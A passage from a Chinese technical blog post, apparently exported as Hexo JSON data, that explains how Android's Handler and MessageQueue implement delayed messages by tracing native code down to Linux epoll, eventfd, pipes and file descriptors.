epoll_event eventItems[EPOLL_MAX_EVENTS];\n    // 【重点】epoll_wait系统调用就是整个消息机制阻塞的真正位置，阻塞等待同时可以读取管道的通知，下文详解\n    int eventCount = epoll_wait(mEpollFd.get(), eventItems, EPOLL_MAX_EVENTS, timeoutMillis);\n    // epoll_wait返回事件（注意这里返回有可能是timeout时间到了，也可能是中途被唤醒），退出idle状态，重新取得CPU执行机会\n    mPolling = false;\n    ...\n    // 返回-1的话表示error了，直接goto到Done代码行\n    if (eventCount < 0) {\n        ...\n        result = POLL_ERROR;\n        goto Done;\n    }\n    // 返回0表示timeout时间到了（说明这期间没有新的消息导致中途唤醒），正常Done\n    if (eventCount == 0) {\n        result = POLL_TIMEOUT;\n        goto Done;\n    }\n    // 返回eventCount大于0，说明timeout未到，就有新的事件写入管道导致提前唤醒\n    for (int i = 0; i < eventCount; i++) {\n        int fd = eventItems[i].data.fd;\n        uint32_t epollEvents = eventItems[i].events;\n        if (fd == mWakeEventFd.get()) {\n            if (epollEvents & EPOLLIN) {\n                awoken(); // 【重点】被唤醒了\n            } else {\n                ...\n            }\n        } else {\n            ...\n        }\n    }\nDone: ;\n    ...\n    return result;\n}\n```\n\n`pollInner` 代码很长，但其实核心就是 `epoll_wait` 这个系统调用，我们先大概看看它的函数定义（[epoll_wait(2) — Linux manual page](https://man7.org/linux/man-pages/man2/epoll_wait.2.html) ， [Epoll-wiki](https://zh.wikipedia.org/wiki/Epoll)），后文再详解：\n\n```c\nint epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout);\n```\n\nepoll_wait这里也是**整个Android消息机制阻塞的真正位置，阻塞等待期间可以保证线程进入休眠状态，不占用CPU资源，同时监听所注册的事件**。\n\n简单地讲，就是等待注册在文件描述符 `epfd` 上的事件，等事件产生的时候，传入的events数组会被填充，以便于epoll_wait返回后处理事件，也就是我们上面源码中 `for (int i = 0; i < eventCount; i++)` 干的事情。所以这个epoll应该是一个**事件驱动的机制**。\n\n为什么不着急讲上面的 `awoken()` 函数，因为在此之前，我们必须基本了解Linux的**文件描述符**（fd）、**管道**（pipe）和**epoll**机制，有了这些预备知识我们就能明白一切了。\n\n## 内核知识简介\n\n#### 文件描述符（File Descriptor）\n\n以下部分简称FD。摘录[维基百科的概念](https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6)：\n\n> 计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。\n\n概念看起来有点抽象，在理解FD之前我们需要感悟Linux的设计思想：**一切皆文件**。“Linux中一切都可以看作文件，包括普通文件、链接文件、Socket以及设备驱动等，对其进行相关操作时，都可能会创建对应的文件描述符。文件描述符是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有I/O操作相关的系统调用（例如read、write等）都需要通过文件描述符。”\n\n可见，在Linux中，FD就是一种宝贵的系统资源，就像工业时代的石油一样，没有它，我们的文件系统就无法运转。本质上，一个Linux进程启动后，会在内核空间生成文件描述符表（FD Table），记录当前进程所有可用的FD，也即映射着该进程所有打开的文件，这里引用一张其他大佬的[图](http://c.biancheng.net/view/3066.html)，就更形象了：\n\n![](https://imgconvert.csdnimg.cn/img_convert/9419696c40b1897d7d7d7f46ba2ffd63.gif)\n\n**FD实际上就是文件描述符表的数组下标（所以是非负整数）**。通俗地总结就是系统操作I/O资源的钥匙。更多细节大家可自行查阅或参考文末链接，此处点到为止。\n\n我们由此还可以萌生一个初步概念：有了方便的文件操作，我们就能实现跨进程通信了。\n\n#### 管道（pipe）\n\n那么什么又是管道呢？同样地，我们先看看[百科的概念](https://zh.wikipedia.org/wiki/%E7%AE%A1%E9%81%93_(Unix))：\n\n> 在类Unix操作系统（以及一些其他借用了这个设计的操作系统，如Windows）中，管道（英语：Pipeline）是一系列将标准输入输出链接起来的进程，其中每一个进程的输出被直接作为下一个进程的输入。\n> 这个概念是由道格拉斯·麦克罗伊为Unix命令行发明的，因与物理上的管道相似而得名。\n\n这个概念还算比较形象，管道就是通常用于进程间通信的一种机制。如其名，就像水管的一端输水，另一端接水。pipe的发明人发现系统操作执行命令的时候，经常有需求要将一个程序的输出交给另一个程序进行处理，这种操作可以使用输入输出配合文件来实现，比如：\n\n```bash\nls > abc.txt # 把当前目录的文件列表输入到abc文本\ngrep xxx abc.txt # adb文本作为输出，让grep程序查找内容xxx\n```\n\n这确实很麻烦，管道的出现简化了这个操作，现在我们可以用管道符（通常这么称呼）竖线来连接两个命令：\n\n```bash\nls | grep xxx\n```\n\n达到同样的效果，还不需要显式地产生文件。shell会用一个管道连接两个进程的输入输出，以此实现跨进程通信。因此，我们可以把管道的本质理解成一个文件，前一个进程用写的方式打开文件，后一个进程用读的方式打开。所以管道的系统调用函数是这样的：\n\n```c\nint pipe(int pipefd[2]);\n```\n\n函数调用后会创建2个文件描述符，即填充pipefd数组，其中pipefd[0]是读方式打开，pipefd[1]是写方式打开，分别作为管道的读和写描述符。管道虽然形式上是文件，但本身并不占用磁盘存储空间，而是占用的内存空间，所以管道是一个操作方式和文件相同的内存缓冲区（所以我们也不用狭隘地理解Linux中的文件，并非存在磁盘上的才叫文件）。**写入管道的数据会被缓存到直到另一端读取为止，所以上述命令是阻塞的**，在ls没有结果产生之前grep并不会执行。\n\n所以在实践中，我们通常让一个进程关闭读端，另一个进程关闭写端，以实现单工通信，引用一张其他大佬的[图](https://zhuanlan.zhihu.com/p/58489873)：\n\n![](https://imgconvert.csdnimg.cn/img_convert/ed02bb53a696f14c3e854c2573a164b8.png)\n\n类似这样的代码，了解其形式即可（更多细节可以参考文末链接）：\n\n```c\n// 父进程fork产生子进程后\n// parent进程\nread(pipefd[0], ...);\n// child进程\nwrite(pipefd[1], ...);\n```\n\n此外，我们必须清楚的是，**pipe并不只能用于跨进程通信，在同一个进程内当然也是可用的**。\n\n#### epoll\n\n了解文件描述符和管道后，我们终于可以讲epoll机制了。依然先看定义：\n\n> epoll是Linux内核的可扩展I/O事件通知机制。于Linux 2.5.44首度登场，它设计目的旨在取代既有POSIX select(2)与poll(2)系统函数，让需要大量操作文件描述符的程序得以发挥更优异的性能。epoll 实现的功能与 poll 类似，都是监听多个文件描述符上的事件。\n> epoll 通过使用红黑树(RB-tree)搜索被监控的文件描述符(file descriptor)。在 epoll 实例上注册事件时，epoll 会将该事件添加到 epoll 实例的红黑树上并注册一个回调函数，当事件发生时会将事件添加到就绪链表中。\n\n说明epoll是一种I/O**事件通知机制**（事件驱动的，犹如观察者模式）。我们上文提到管道机制，需要一端写数据另一端才能读数据，但在实践中，我们往往不能这样无尽地等待，而是**希望有一个监听，你什么时候写再通知我去读**。\n\n在epoll出现之前，也有诸如select和poll这样的监听机制，但是效率比较低，有些需要无差别遍历FD，虽然也是非阻塞，但唤醒后要轮询I/O，或者是有FD监听数量上限等缺点，具体此处不赘述。\n\n总之，epoll解决了这些问题，实现了高性能的I/O多路复用，还使用[mmap](https://www.cnblogs.com/huxiao-tee/p/4660352.html)加速内核与用户空间的消息传递。[epoll的系统调用](https://man7.org/linux/man-pages/man7/epoll.7.html)也比较简单，就3个函数：\n\n```c\n// 在内核中创建epoll实例并返回一个epoll文件描述符\nint epoll_create(int size);\nint epoll_create1(int flags);\n// 向epfd（上面create的）对应的epoll实例添加、修改或删除对fd（即第3个参数）上事件event的监听\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);\n// 这个函数我们上文就提到了，它等待注册在epfd上面的事件，事件从events参数中带出\nint epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout);\n```\n\nepoll内部实现还是比较复杂的，用红黑树结构管理fd，双向链表结构管理回调的事件，具体可以参考文末链接。简单的讲一下原理，`epoll_ctl` 函数会把传入的fd和event进行存储，并与相应的设备驱动程序建立关系，当相应的事件发生时，就会调用内部的回调函数将事件添加到链表中，最终通知线程唤醒，`epoll_wait` 得以返回。没有事件发生时，`epoll_wait` 就是挂起状态。 \n\n这里**注意不要混淆了**：epfd是epoll程序实例的描述符或者说索引；fd是与你想要监听的事件所对应的描述符，最终读写管道依赖的也是这个fd。\n\n## 回溯Native层\n\n终于搞清楚了epoll，我们再回去看MessageQueue和Looper的Native源码，就非常清晰了。\n\n还记得我们上文MQ中的mPtr变量吗，实际上在MQ的构造方法中进行了初始化：\n\n```java\nMessageQueue(boolean quitAllowed) {\n    mQuitAllowed = quitAllowed;\n    mPtr = nativeInit(); // 本地调用\n}\n```\n\n所以在Native层也有一个MQ对象，mPtr是MQ在Native层的一个映射引用，方便上层寻址访问：\n\n```cpp\nstatic jlong android_os_MessageQueue_nativeInit(JNIEnv* env, jclass clazz) {\n    NativeMessageQueue* nativeMessageQueue = new NativeMessageQueue();\n    ...\n    return reinterpret_cast<jlong>(nativeMessageQueue); // long类型，实际上就是个地址\n}\n\nNativeMessageQueue::NativeMessageQueue() : mPollEnv(NULL), mPollObj(NULL), mExceptionObj(NULL) {\n    mLooper = Looper::getForThread();\n    if (mLooper == NULL) {\n        mLooper = new Looper(false); // Native的MQ在初始化时还创建了Looper的实例\n        Looper::setForThread(mLooper);\n    }\n}\n```\n\n再看看Looper的初始化过程：\n\n```cpp\nLooper::Looper(bool allowNonCallbacks)\n    ...\n    // eventfd系统函数创建一个文件描述符，赋值给mWakeEventFd（唤醒事件描述符），待会儿管道的读写都会在此FD上进行\n    mWakeEventFd.reset(eventfd(0, EFD_NONBLOCK | EFD_CLOEXEC));\n    ...\n    // 【重点】构造了epoll实例\n    rebuildEpollLocked();\n}\n\nvoid Looper::rebuildEpollLocked() {\n    // 如果已经有epoll实例对应的描述符，先重置\n    if (mEpollFd >= 0) {\n        ...\n        mEpollFd.reset();\n    }\n\n    // 创建新的epoll实例和唤醒管道（wake pipe）\n    // 【重点】此处用epoll_create1函数创建了实例并将返回赋值给mEpollFd描述符\n    mEpollFd.reset(epoll_create1(EPOLL_CLOEXEC));\n\n    struct epoll_event eventItem;\n    memset(& eventItem, 0, sizeof(epoll_event));\n    eventItem.events = EPOLLIN; // IN，监听管道的输入（即write）操作\n    // 唤醒事件fd要由event数据持有，等会儿唤醒时才能进行查找匹配\n    eventItem.data.fd = mWakeEventFd.get();\n    // 【重点】用epoll_ctl函数注册唤醒事件的监听，EPOLL_CTL_ADD表示添加事件的操作标志\n    int result = epoll_ctl(mEpollFd.get(), EPOLL_CTL_ADD, mWakeEventFd.get(), &eventItem);\n    ...\n}\n```\n\n此时我们再回过头去看Looper的 `pollInner` 函数，`epoll_create1` 、  `epoll_ctl`  、 `epoll_wait` 这三个epoll流程就这样联系了起来：\n\n```cpp\nint Looper::pollInner(int timeoutMillis) {\n    ...\n    // 【重点】epoll_wait系统调用就是整个消息机制阻塞的真正位置，阻塞等待同时可以读取管道的通知\n    int eventCount = epoll_wait(mEpollFd.get(), eventItems, EPOLL_MAX_EVENTS, timeoutMillis);\n    ...\n    // 返回eventCount大于0，说明timeout未到，就有新的事件写入管道导致提前唤醒\n    for (int i = 0; i < eventCount; i++) {\n        int fd = eventItems[i].data.fd;\n        uint32_t epollEvents = eventItems[i].events;\n        if (fd == mWakeEventFd.get()) { // 查找匹配唤醒事件\n            if (epollEvents & EPOLLIN) {\n                awoken(); // 【重点】被唤醒\n            } else {\n    ...\nDone: ;\n    ...\n    return result;\n}\n            \nvoid Looper::awoken() {\n    uint64_t counter;\n    // 进行读操作\n    TEMP_FAILURE_RETRY(read(mWakeEventFd.get(), &counter, sizeof(uint64_t)));\n}\n```\n\n可见，`awoken` （被唤醒的意思）函数实际上就是一个管道的读操作，既然此时被epoll事件驱动唤醒起来读，那么肯定就是监听到对应的写操作导致的，显然，写操作就在 `wake` 函数中：\n\n```cpp\nvoid Looper::wake() {\n    uint64_t inc = 1;\n    // 往wake pipe里面写了一个1，触发了唤醒\n    ssize_t nWrite = TEMP_FAILURE_RETRY(write(mWakeEventFd.get(), &inc, sizeof(uint64_t)));\n    ...\n}\n```\n\n这里需要额外提醒一下，旧版本的源码是这样创建唤醒事件描述符的：\n\n```cpp\nint wakeFds[2];\nint result = pipe(wakeFds);\nmWakeReadPipeFd = wakeFds[0];\nmWakeWritePipeFd = wakeFds[1];\n```\n\n读和写是两个描述符，而最新的系统源码中只用了一个mWakeEventFd描述符，可能是考虑到Handler消息机制并不需要跨进程的缘故，具体还有待研究。\n\n上述的 `Looper::wake()` 函数源头其实就是是由MQ的 `nativeWake` 函数调用的：\n\n```cpp\nstatic void android_os_MessageQueue_nativeWake(JNIEnv* env, jclass clazz, jlong ptr) {\n    NativeMessageQueue* nativeMessageQueue = reinterpret_cast<NativeMessageQueue*>(ptr);\n    nativeMessageQueue->wake(); // MQ内部会进一步调用Looper::wake()\n}\n```\n\n回想一下上文，`nativeWake(mPtr);` 在Java层就是由 `enqueueMessage` 方法调用的，即消息入队时。至此，我们终于贯通了整个流程，从Java层一直探索到了Linux内核的系统调用，喜大普奔啊！\n\n总结一下，回到标题，为什么说**没有epoll就没有Handler**。因为Handler + Looper + MessageQueue这一套消息机制之所以可以处理延时消息，且达到事件驱动的效果，还不占用CPU资源，究其本质就是Native层使用了Linux内核的epoll I/O事件通知机制。满足了两个场景：\n\n- 当通过 `postDelayed` 发送延时消息后，传入的时间最终会通过 `nativePollOnce` 方法进行带超时的阻塞，本质上是因为 `epoll_wait` 函数的挂起，达到了延时的目的。\n\n  时间到后阻塞结束，`epoll_wait` 返回，线程被重新唤醒并获得CPU资源，且epoll事件数（event_count）为0，说明中途没被唤醒，然后 `nativePollOnce` 直接返回，进而MQ的 `next` 方法再返回消息对象给上层Looper。\n\n- 在MessageQueue的 `enqueueMessage` 方法中会判断新插入的消息的时间是否小于队头消息的时间，以决定要不要立即唤醒，即通过 `nativeWake` 方法打断超时未到的阻塞。\n\n  若需唤醒，便会往wake pipe唤醒管道中写入数据（其实就是一个整数1），由于epoll监听了mWakeEventFd唤醒事件描述符，所以此时 `epoll_wait` 结束了挂起状态，返回事件数大于0，进而调用到 `awoken`，最后 `nativePollOnce` 返回result为POLL_WAKE，上层消息得以继续处理。因为我们知道Looper的loop是一直在循环调用next的，如果底层不醒，上层就会阻塞。\n\n所以要么是timeout到了自动唤醒，要么是由于新消息插入导致主动唤醒。用不太严谨的流程图来描述一下主动唤醒的过程：\n\n![](https://imgconvert.csdnimg.cn/20201119000301533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n## 后话\n\n在应用进程退到后台时，一般情况下就没有什么消息发送了，所以主线程便阻塞在queue.next()中的 `nativePollOnce` 方法里，并释放CPU资源进入休眠状态，并不会消耗大量CPU资源。即便在前台，只要你的UI没有动画绘制或者没有触摸交互，也是差不多的状态。这也回答了为什么Looper中在进行无限循环却不会导致异常耗电的问题。\n\n关于Linux系统调用为什么可以挂起且不占用CPU时间片，CPU的定时器和中断又是怎么实现的？那可能就涉及到硬件知识了，好好复习组成原理吧哈哈哈。后续有空我也会补充上来。\n\n其实研究到最后，我才悟出了为什么epoll要叫epoll，因为它和原来poll机制的最大区别就是改善成了event（事件）驱动，这个e如果我没猜错的话应该代表的就是event。\n\n## 参考\n\n- [Android中的Handler的Native层研究](https://my.oschina.net/u/3863980/blog/1933086)\n- [Linux 文件描述符到底是什么？](http://c.biancheng.net/view/3066.html)\n- [理解Linux的文件描述符FD与Inode](https://zhuanlan.zhihu.com/p/143430585)\n- [文件描述符fd（File Descriptor）简介](https://juejin.im/post/6844904005202608136)\n- [Linux 的进程间通信：管道](https://zhuanlan.zhihu.com/p/58489873)\n- [Linux管道命令（pipe）](https://www.jianshu.com/p/9c0c2b57cb73)\n- [Linux下的I/O复用与epoll详解](https://www.cnblogs.com/lojunren/p/3856290.html)\n- [异步阻塞IO —— epoll](https://blog.csdn.net/sunyurun/article/details/8194979)\n- [Handler 中的 epoll](https://www.jianshu.com/p/1cda21639f3e)\n","slug":"源码茶舍之没有epoll就没有Handler","published":1,"updated":"2024-03-25T07:31:25.864Z","comments":1,"photos":[],"link":"","_id":"cluaufh16003athe6anvr4qvp","content":"<blockquote>\n<p>Handler，英文释义：处理者，处理程序。他就是Android系统中的打工人，背负着传递消息的重任。很多人在第一次尝试去阅读framework源码时，可能也是从Handler消息机制开始的，我们会发现源码的很多地方都用到了Handler。然而，他好像并没有我们想象的那么简单，如果我们要深入探索的话，可以一直追溯到Linux内核。</p>\n</blockquote>\n<h2 id=\"预备\"><a href=\"#预备\" class=\"headerlink\" title=\"预备\"></a>预备</h2><p>本文分析源码均基于API 29，来源于官方AOSP：<a href=\"https://cs.android.com/android/platform/superproject/\">cs.android.com</a></p>\n<h2 id=\"问号\"><a href=\"#问号\" class=\"headerlink\" title=\"问号\"></a>问号</h2><p>Handler的API使用还是比较简单的，我们比较常用的就是通过类似如下方式来发送一个Runnable到Handler所在线程去执行：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">Handler</span>().post(() -&gt; &#123; <span class=\"comment\">/* do something */</span> &#125;);</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">Handler</span>().postDelayed(() -&gt; &#123; <span class=\"comment\">/* do something after 3s */</span> &#125;, <span class=\"number\">3000</span>);</span><br></pre></td></tr></table></figure>\n\n<p>这里为了简单直接用了匿名类，当然你也可以实现自定义的Handler并重写 <code>handleMessage</code> 方法来处理消息。<code>post</code> 最终其实还是调用到了Handler的  <code>sendMessageDelayed</code> 方法，将Runnable封装成一个Message发送到消息队列MessageQueue中，最后再由Looper循环将其取出，再交回Handler来处理。因此我们在子线程调用主线程的Handler来发送消息时，就达到了异步执行任务再将结果告知主线程的目的。</p>\n<p>好奇的同学就会有问号了，<strong>这个上面的delay延迟执行是如何实现的（今天的重点）？</strong>是定时器吗？还是周期性轮询？还是事件驱动？带着这些疑问，就不得不深入源码了。</p>\n<h2 id=\"Java层\"><a href=\"#Java层\" class=\"headerlink\" title=\"Java层\"></a>Java层</h2><p>废话不多说直接看Handler源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">sendMessageDelayed</span><span class=\"params\">(<span class=\"meta\">@NonNull</span> Message msg, <span class=\"type\">long</span> delayMillis)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (delayMillis &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        delayMillis = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">sendMessageAtTime</span><span class=\"params\">(<span class=\"meta\">@NonNull</span> Message msg, <span class=\"type\">long</span> uptimeMillis)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">MessageQueue</span> <span class=\"variable\">queue</span> <span class=\"operator\">=</span> mQueue;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> enqueueMessage(queue, msg, uptimeMillis);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里有个细节，最终调用的是 <code>sendMessageAtTime</code> 方法，且并没有直接把delay时长传进去，而是通过加当前时间得到一个确切时间作为参数传递的。这样做的原因：后续调用到系统底层时，若再需要这个delay，会用这个确切的uptime减去新的当前时间，保证精准，减少误差（因为从应用层调用到底层还是需要不少时间的）。</p>\n<p>Handler的 <code>enqueueMessage</code> 方法稍作处理后会调用到MessageQueue的同名方法，在分析之前我们大脑中先保留一个粗浅的概念以便于理解后面的源码，就是<strong>当消息队列为空或者队头的消息delay时间还没到时，相关代码阻塞（但线程释放CPU资源进入休眠状态），新的消息来时才可能唤醒</strong>，后面我们会剖析其原理。说回来，先看MessageQueue的 <code>enqueueMessage</code> ：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">boolean</span> <span class=\"title function_\">enqueueMessage</span><span class=\"params\">(Message msg, <span class=\"type\">long</span> when)</span> &#123; <span class=\"comment\">// when就是上面的uptimeMillis</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (<span class=\"built_in\">this</span>) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        msg.when = when; <span class=\"comment\">// 刚才得到的uptimeMillis赋值给msg消息对象了</span></span><br><span class=\"line\">        <span class=\"type\">Message</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> mMessages; <span class=\"comment\">// 为什么mMessages命名是复数，因为是一个链表结构，来存储消息队列</span></span><br><span class=\"line\">        <span class=\"type\">boolean</span> needWake; <span class=\"comment\">// 是否需要唤醒，为什么要唤醒？后面会讲到</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p == <span class=\"literal\">null</span> || when == <span class=\"number\">0</span> || when &lt; p.when) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 插入消息到队头，如果阻塞就唤醒</span></span><br><span class=\"line\">            msg.next = p;</span><br><span class=\"line\">            mMessages = msg;</span><br><span class=\"line\">            needWake = mBlocked;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 下面这一堆（比如isAsynchronous）可以暂时不管，只用知道是在做新消息插入到链表的操作就可以了</span></span><br><span class=\"line\">            needWake = mBlocked &amp;&amp; p.target == <span class=\"literal\">null</span> &amp;&amp; msg.isAsynchronous();</span><br><span class=\"line\">            Message prev;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">                prev = p;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">                <span class=\"comment\">// for循环结合这里的if条件，保证了消息是按when时间排序的</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (p == <span class=\"literal\">null</span> || when &lt; p.when) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (needWake &amp;&amp; p.isAsynchronous()) &#123;</span><br><span class=\"line\">                    needWake = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            msg.next = p; <span class=\"comment\">// 经过上面的变换，这里的p实际上是prev原本的next节点</span></span><br><span class=\"line\">            prev.next = msg; <span class=\"comment\">// 再更新prev的next节点，msg正式插入消息队列</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (needWake) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 【重点】进行native方法调用唤醒，这里的mPtr其实是MessageQueue在native层对象的引用，后面会讲到</span></span><br><span class=\"line\">            nativeWake(mPtr);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这段代码比较简单，主要就是把新来的消息按delay时间排序入队，并在必要情况下进行唤醒操作。产生的疑问便是：</p>\n<ul>\n<li>这个唤醒是唤醒了个什么？为什么要进行native方法调用？</li>\n<li>传进来的when时间字段赋值给msg了，后续又如何利用的呢？</li>\n</ul>\n<p>带着这些问题，我们就要去找Looper了，因为它是整个消息机制流水线的发动机，其动力在 <code>loop</code> 方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">loop</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Looper</span> <span class=\"variable\">me</span> <span class=\"operator\">=</span> myLooper(); <span class=\"comment\">// 一个线程对应一个Looper</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">MessageQueue</span> <span class=\"variable\">queue</span> <span class=\"operator\">=</span> me.mQueue; <span class=\"comment\">// 每个Looper对应一个消息队列</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        <span class=\"type\">Message</span> <span class=\"variable\">msg</span> <span class=\"operator\">=</span> queue.next(); <span class=\"comment\">// might block（会阻塞）</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>原来Looper这个家伙很懒啊，直接调用了queue的 <code>next</code> 方法，并没有单独去处理消息delay时间的问题。结果还是MessageQueue最累。当然，Looper本身的职责也不是这些，它做好消息的分发就行了。</p>\n<p>来看MQ的 <code>next</code> 方法，马上我们就要进入仙境了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Message <span class=\"title function_\">next</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">ptr</span> <span class=\"operator\">=</span> mPtr; <span class=\"comment\">// 拿到MQ的native层引用</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">nextPollTimeoutMillis</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; <span class=\"comment\">// 下一次轮询的超时时间，这也是我们首次看到poll这个词汇</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"comment\">// 【重点】又是一个native方法，它会进行阻塞，这就是为什么消息可以延迟的初步原因</span></span><br><span class=\"line\">        nativePollOnce(ptr, nextPollTimeoutMillis);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (<span class=\"built_in\">this</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 阻塞结束，开始获取并返回msg对象给Looper</span></span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">now</span> <span class=\"operator\">=</span> 